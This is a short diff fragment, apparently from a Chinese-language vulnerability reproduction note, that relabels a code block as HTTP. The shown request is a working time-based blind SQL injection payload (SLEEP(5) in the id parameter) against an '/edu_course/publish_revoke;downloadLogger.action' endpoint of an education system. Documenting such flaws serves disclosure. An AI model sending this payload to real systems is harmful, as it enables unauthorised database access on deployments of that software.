@@ -56,7 +56,7 @@ schema_version: "1"
 
 
 # 四、漏洞复现
-```java
+```http
 GET /edu_course/publish_revoke;downloadLogger.action?id=(SELECT+5394+FROM+(SELECT(SLEEP(5)))tdpw)--+&value=1 HTTP/1.1
 Host: 
 Pragma: no-cache
